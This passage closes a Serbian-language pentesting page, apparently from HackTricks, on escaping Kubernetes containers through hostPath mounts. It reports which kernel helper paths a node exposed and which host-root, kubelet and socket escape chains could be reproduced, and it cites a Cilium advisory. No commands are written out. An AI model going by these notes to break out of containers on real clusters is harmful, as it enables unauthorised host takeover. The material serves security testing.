- odloženo izvršavanje na hostu preko privremenog hook-a koji obrađuje host
- simulaciju CNI omotača koja je sačuvala argumente, standardni ulaz i izvršavanje originalnog dodatka

Isti čvor je izložio `core_pattern`, `modprobe`, `binfmt_misc/register`, `kallsyms`, `kcore` i `config.gz`, ali nije izložio `uevent_helper`, EFI promenljive, termalne unose ni `sched_debug`. Destruktivni okidači jezgra nisu pokrenuti. Ovo potvrđuje da se lanci koji uključuju host-root, `/var`, kubelet stanje, sockete i procese na hostu mogu reprodukovati, dok tehnike sa procfs/sysfs pomoćnim mehanizmima moraju zavisiti od konkretnog jezgra, režima mount-a, putanje payload-a i okidača.

## References

- [1] [Lokalne datoteke i putanje koje koristi Kubelet](https://kubernetes.io/docs/reference/node/kubelet-files/)
- [2] [Kontejner cilium-agent može da pristupi hostu preko `hostPath` mount-a](https://github.com/cilium/cilium/security/advisories/GHSA-4hc4-pgfx-3mrx)
{{#include ../../../banners/hacktricks-training.md}}
